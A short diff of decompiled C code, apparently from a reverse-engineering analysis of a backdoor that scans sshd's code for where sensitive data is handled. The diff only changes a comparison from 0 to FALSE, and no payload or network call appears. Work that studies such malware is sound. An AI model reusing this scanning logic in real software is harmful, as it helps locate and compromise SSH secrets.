@@ -25,7 +25,7 @@ int sshd_get_sensitive_data_score_in_demote_sensitive_data
   if (code_start != (u8 *)0x0) {
     BVar1 = find_instruction_with_mem_operand
                       (code_start,(u8 *)refs->entries[3].func_end,(dasm_ctx_t *)0x0,sensitive_data);
-    if (BVar1 == 0) {
+    if (BVar1 == FALSE) {
       iVar2 = 0;
     }
     else {
